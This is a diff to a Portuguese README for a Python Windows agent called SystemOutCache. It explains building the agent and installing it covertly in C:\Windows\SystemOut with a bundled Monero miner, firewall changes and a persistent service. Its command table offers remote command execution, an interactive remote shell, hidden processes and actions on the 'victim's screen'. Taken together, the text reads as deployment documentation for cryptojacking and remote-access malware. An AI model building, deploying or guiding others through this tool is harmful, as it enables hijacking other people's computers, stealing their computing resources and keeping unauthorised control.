@@ -27,48 +27,67 @@ Console de comando para o administrador. Permite:
 - **Linguagem**: Python 3.10+
 - **Core Libs**: `socket`, `threading`, `subprocess`.
 - **System Internals**: `pywin32` (win32service, win32event), `ctypes`, `psutil`.
-- **Automação**: PowerShell 5.1+ (para instalação e regras de Firewall).
+- **Automação**: `argparse` (CLI), PowerShell 5.1+.
 - **Build**: PyInstaller (Compilação para `.exe` standalone compatível com Windows 10/11).
 
 ## 📦 Instalação e Deploy
 
-### 1. Preparação (Build)
-Como o Python não é nativo no Windows, a prática recomendada é compilar o agente.
-*(Veja `BUILD_INSTRUCTIONS.md` para detalhes completos)*.
+### 1. Preparação (Dependências e Build)
 
+Instale as bibliotecas necessárias:
 ```bash
-# Na máquina de desenvolvimento
-pyinstaller --noconsole --onefile --hidden-import=win32timezone --name=SystemOutCache SystemOutCache.py
+pip install -r requirements.txt
+# Ou manualmente:
+pip install pywin32 psutil pyinstaller auto-py-to-exe
 ```
 
-### 2. Instalação na Máquina Alvo
-Copie o arquivo `SystemOutCache.exe` (gerado na pasta `dist`) para a máquina alvo.
+Para gerar os executáveis com ícones e permissões corretas, execute:
 
-**Instalação Automática (One-Click):**
-Basta dar **duplo clique** no arquivo `SystemOutCache.exe`.
+**Server Agent (SystemOutCache.exe):**
+```bash
+pyinstaller --onefile --uac-admin --clean --noconfirm --icon="SystemOutCache.ico" --name SystemOutCache --hidden-import=win32timezone --hidden-import=psutil SystemOutCache.py
+```
 
-*O executável irá:*
-1.  Solicitar privilégios de Administrador (se não tiver).
-2.  Configurar automaticamente o Firewall (Portas 7722 TCP/UDP).
-3.  Instalar-se como Serviço do Windows.
-4.  Configurar recuperação automática.
-5.  Iniciar imediatamente em background.
+**Config Tool (SystemNetConfig.exe):**
+```bash
+pyinstaller --onefile --uac-admin --clean --noconfirm --icon="SystemOutCache.ico" --name SystemNetConfig --hidden-import=win32com --hidden-import=win32com.client --hidden-import=pythoncom --hidden-import=pywintypes SystemNetConfig.py
+```
 
-> **Nota:** Se quiser rodar manualmente ou depurar, pode usar comandos via terminal como `SystemOutCache.exe debug` ou `SystemOutCache.exe remove`.
+### 2. Instalação na Máquina Alvo (Easy Deploy)
+
+O pacote de instalação (`INSTALADOR`) foi desenhado para ser implantado em segundos.
+
+**Passo a Passo:**
+1.  Copie os **2 arquivos** da pasta `INSTALADOR` para qualquer lugar na máquina alvo (ex: Área de Trabalho):
+    *   `Install.bat` (Script de Instalação)
+    *   `SystemOut.zip` (Pacote contendo Agente, ConfigTool e Minerador XMR)
+
+2.  **Execute o `Install.bat`** (Duplo clique).
+    *   Extrai o pacote.
+    *   **Move tudo para**: `C:\Windows\SystemOut\` (Local seguro e oculto).
+    *   Executa o `SystemOutCache.exe` a partir deste novo local.
+
+3.  **O que o Agente (`SystemOutCache.exe`) faz automaticamente:**
+    *   Solicita privilégios de Administrador.
+    *   Configura Firewall (Libera Porta 7722).
+    *   Instala-se como **Serviço do Windows** (Início automático).
+    *   Inicia imediatamente em background.
+
+> **Nota:** O `SystemNetConfig.exe` (Ferramenta de Rede) é instalado junto, mas permanece **inativo e silencioso**. Ele só será executado quando você comandar via Client (ex: `SHELL: SystemNetConfig`).
 
 ## 🕹 Manual de Uso (Comandos)
 
-No `client.py`, conecte-se ao IP da máquina alvo. Os seguintes comandos estão disponíveis:
+No `client.py`, conecte-se ao IP da máquina alvo.
 
-| Comando | Sintaxe | Descrição |
-| :--- | :--- | :--- |
-| **START** | `START:<cmd> [--dir <path>]` | Inicia um processo em background. Ex: `START:xmrig.exe --dir C:\Miner` |
-| **STOP** | `STOP:<pid>` | Encerra forçadamente um processo pelo ID. |
-| **STOPNAME** | `STOPNAME:<nome>` | Encerra **todos** os processos com determinado nome. Ex: `STOPNAME:chrome` |
-| **LIST** | `LIST` | Lista processos iniciados e gerenciados pelo agente. |
-| **FIND** | `FIND:<nome>` | Busca qualquer processo rodando no sistema pelo nome. |
-| **PROCESSES** | `PROCESSES` | Lista os Top 50 processos consumindo CPU na máquina. |
-| **EXEC** | `EXEC:<cmd>` | Executa um comando de terminal (cmd/powershell) e retorna o output texto. |
+| Comando | Descrição |
+| :--- | :--- |
+| **EXEC:<cmd>** | Executa comando e retorna texto (`ipconfig`). Síncrono. |
+| **START:<cmd>** | Inicia processo oculto (Background). Retorna PID. |
+| **SHELL:<cmd>** | **Túnel Interativo**. Terminal completo remoto (`SHELL:cmd.exe`). |
+| **START:VISIBLE**| Abre programa na **TELA DA VÍTIMA** (`START:VISIBLE:notepad.exe`). |
+| **STOP:<pid>** | Para processo por ID. (Cuidado com "zumbis"). |
+| **STOPNAME:<name>**| **Kill All**. Mata todos com esse nome (`STOPNAME:xmrig`). |
+| **LIST** | Lista processos gerenciados pelo agente. |
 
 ## 📂 Estrutura de Arquivos
 
